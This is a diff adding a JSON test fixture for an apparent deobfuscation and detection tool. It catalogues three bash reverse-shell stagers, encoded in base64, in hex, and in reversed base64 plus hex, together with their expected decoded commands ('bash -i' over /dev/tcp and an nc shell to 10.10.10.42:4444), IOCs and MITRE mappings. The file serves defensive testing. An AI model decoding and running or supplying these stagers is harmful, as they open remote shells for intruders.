@@ -1,0 +1,184 @@
+{
+  "family_id": "linux_droppers",
+  "family_display_name": "Linux Droppers",
+  "family_version": "r1-2.0.0",
+  "schema_version": "technique-first-1.0.0",
+  "description": "Real-world bash-native reverse-shell droppers and stagers observed in Linux compromise events (TeamTNT, Kinsing, public red-team droppers, Metasploit/Kali stagers).",
+  "primary_mitre_attack": [
+    "T1059.004",
+    "T1027",
+    "T1140",
+    "T1071.001"
+  ],
+  "primary_behaviors": [
+    "reverse_shell",
+    "obfuscated_command_line",
+    "linux_compromise"
+  ],
+  "known_technique_universe": [
+    "bash_echo_base64_pipeline",
+    "bash_echo_hex_pipeline",
+    "bash_echo_rev_base64_pipeline"
+  ],
+  "coverage_gap_techniques": [],
+  "techniques": [
+    {
+      "id": "bash_echo_base64_pipeline",
+      "display_name": "bash echo | base64 -d | pipeline",
+      "description": "Canonical Kali/Metasploit bash reverse-shell stager: `echo '<b64>' | base64 -d | bash`. Observed in TeamTNT, Kinsing, and dozens of public CTF/IR writeups.",
+      "mitre_attack": [
+        "T1059.004",
+        "T1027",
+        "T1140",
+        "T1071.001"
+      ],
+      "samples": [
+        {
+          "id": "LD001",
+          "variant": "echo_base64_decode_bash_pipeline",
+          "input": "echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC40Mi80NDQ0IDA+JjE=' | base64 -d",
+          "expected": {
+            "interpreter": "bash",
+            "final_interpreter": "bash",
+            "decoder_chain": [
+              "bash-pipeline-reduce"
+            ],
+            "final_output_contains": [
+              "bash -i",
+              "/dev/tcp/10.10.10.42/4444"
+            ],
+            "iocs_contains": [
+              "/dev/tcp/10.10.10.42/4444"
+            ],
+            "mitre_attack": [
+              "T1059.004",
+              "T1027",
+              "T1140",
+              "T1071.001"
+            ],
+            "behaviors": [
+              "reverse_shell",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "eaf5d9db5ab4553cf03c97ad9419cdeee7babfa08ac65790909bd67db4ffe9e6",
+              "certificate_fingerprint": "b679f6b9b76c7b37b3abaddd3f0bdee130ea9a6a2a0c4c8b3be9314fe54beb3d",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:23:42+00:00"
+            },
+            "capabilities": [
+              "reverse_shell"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "bash_echo_hex_pipeline",
+      "display_name": "bash echo | xxd -r -p pipeline",
+      "description": "Hex-encoded bash stager: `echo '<hex>' | xxd -r -p | bash`. Observed in TeamTNT / Kinsing cryptomining loaders.",
+      "mitre_attack": [
+        "T1059.004",
+        "T1027",
+        "T1140"
+      ],
+      "samples": [
+        {
+          "id": "LD002",
+          "variant": "echo_hex_decode_bash_pipeline",
+          "input": "echo '62617368202d69203e26202f6465762f7463702f31302e31302e31302e34322f3434343420303e2631' | xxd -r -p",
+          "expected": {
+            "interpreter": "bash",
+            "final_interpreter": "bash",
+            "decoder_chain": [
+              "bash-pipeline-reduce"
+            ],
+            "final_output_contains": [
+              "bash -i",
+              "/dev/tcp/10.10.10.42/4444"
+            ],
+            "iocs_contains": [
+              "/dev/tcp/10.10.10.42/4444"
+            ],
+            "mitre_attack": [
+              "T1059.004",
+              "T1027",
+              "T1140"
+            ],
+            "behaviors": [
+              "reverse_shell",
+              "obfuscated_command_line"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "eaf5d9db5ab4553cf03c97ad9419cdeee7babfa08ac65790909bd67db4ffe9e6",
+              "certificate_fingerprint": "620a0a4ced863b682486ec8a764bb084e859caed6d5694e9c95d0a94fafc90d5",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:23:42+00:00"
+            },
+            "capabilities": [
+              "reverse_shell"
+            ]
+          }
+        }
+      ]
+    },
+    {
+      "id": "bash_echo_rev_base64_pipeline",
+      "display_name": "bash echo | rev | base64 -d | xxd -r -p pipeline",
+      "description": "Double-obfuscated bash stager repaired in M8 S02 and observed in public red-team droppers: the payload is hex-then-base64-then-reversed.",
+      "mitre_attack": [
+        "T1059.004",
+        "T1027",
+        "T1140"
+      ],
+      "samples": [
+        {
+          "id": "LD003",
+          "variant": "echo_rev_base64_xxd_pipeline",
+          "input": "echo '==AO2MzNxYjM2YmMlZTO2IjNmJDMyUjNkJDMyQzM0MDNzQzMwIjMzQzMlJDMzEzMlJDMzEzMlJDMzEzMwIzM2UmN' | rev | base64 -d | xxd -r -p",
+          "expected": {
+            "interpreter": "bash",
+            "final_interpreter": "bash",
+            "decoder_chain": [
+              "bash-pipeline-reduce"
+            ],
+            "final_output_contains": [
+              "nc 10.10.10.42 4444",
+              "/bin/bash"
+            ],
+            "iocs_contains": [
+              "10.10.10.42 4444"
+            ],
+            "mitre_attack": [
+              "T1059.004",
+              "T1027",
+              "T1140"
+            ],
+            "behaviors": [
+              "reverse_shell",
+              "obfuscated_command_line",
+              "multi_layer_obfuscation"
+            ],
+            "fingerprint": {
+              "canonical_output_sha256": "88286737d299b1b3eef8eee114040a24dc6ad01f7806dd3aea1b0348f2d7ba91",
+              "certificate_fingerprint": "8cd4bbcdf10801956745762de83ff9e352da751f9d945177a0f1d5da5bf0c567",
+              "expected_iterations": 2,
+              "expected_canonical_state": true,
+              "expected_terminated_reason": "canonical_state",
+              "recorded_at": "2026-08-03T09:23:42+00:00"
+            },
+            "capabilities": [
+              "reverse_shell",
+              "multi_layer_encoding"
+            ]
+          }
+        }
+      ]
+    }
+  ],
+  "fingerprint_schema_version": "r1-2.0.0"
+}
